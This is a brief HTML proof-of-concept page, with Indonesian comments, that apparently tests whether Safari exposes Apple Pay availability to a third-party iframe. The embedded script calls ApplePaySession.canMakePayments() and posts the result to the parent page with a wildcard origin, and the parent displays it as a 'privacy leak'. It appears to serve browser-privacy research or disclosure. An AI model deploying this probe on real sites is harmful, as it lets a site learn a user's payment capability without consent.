<h2>Apple Pay 3rd Party Leak - Safari Only</h2>
<iframe id="f" src="about:blank"></iframe>
<script>
let iframe = document.getElementById('f');
iframe.srcdoc = `
<script>
  if(window.ApplePaySession){
    let can = ApplePaySession.canMakePayments();
    parent.postMessage("LEAK dari iframe 3rd-party: canMakePayments="+can, "*");
  }
<\/script>
`;
window.addEventListener('message', e=>{
  alert(e.data);
  document.body.innerHTML += "<h1 style='color:red'>"+e.data+"</h1><p>Kalau muncul di iframe tanpa gesture = PRIVACY LEAK Safari Only!</p>";
});
</script>
